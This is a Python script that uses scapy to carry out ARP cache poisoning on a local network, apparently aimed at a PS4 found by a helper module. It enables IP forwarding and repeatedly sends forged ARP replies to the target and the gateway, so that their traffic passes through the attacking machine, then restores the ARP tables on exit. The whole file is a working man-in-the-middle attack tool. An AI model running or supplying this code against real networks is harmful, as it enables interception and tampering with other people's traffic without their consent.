#!/usr/bin/env python3

import scapy.all as net
import sys, os, time, math, threading

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
import get_machines

import atexit #force iptables fixing

VERBOSITY = 0

class ARPPoison(threading.Thread):
	def __init__(self, stdout=True):
		super().__init__()
		self.stdout = stdout
		self.running = False
		self.machines = {}

	def run(self):
		atexit.register(self.__del__)
		if self.stdout: print("Finding network devices...")
		self.machines = get_machines.search(ps4=True)

		if self.stdout: print("Enabling IP Forward...")
		with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
			f.write("1")

		if self.stdout: print("ARP Poisoning...")
		self.running = True
		while self.running:
			#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
			net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["this"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
			net.send(net.ARP(op="is-at", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, hwsrc=self.machines["this"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)
			time.sleep(5) #typically kept in the ARP cache for 60s
		self.__del__()

	def __del__(self):
		if not sys.meta_path: #closed
			return
		self.running = False
		if self.stdout: print("Restoring ARP...")
		net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
		net.send(net.ARP(op="is-at", hwdst=self.machines["gateway"].mac, pdst=self.machines["gateway"].ip, hwsrc=self.machines["target"].mac, psrc=self.machines["target"].ip), verbose=VERBOSITY)

		if self.stdout: print("Disabling IP Forward...")
		with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
			f.write("0")
		atexit.unregister(self.__del__)


if __name__ == "__main__":
	try:
		t = ARPPoison()
		t.start()
		while True:
			input()
	except KeyboardInterrupt:
		t.running = False
		t.join()

#forceRestore()
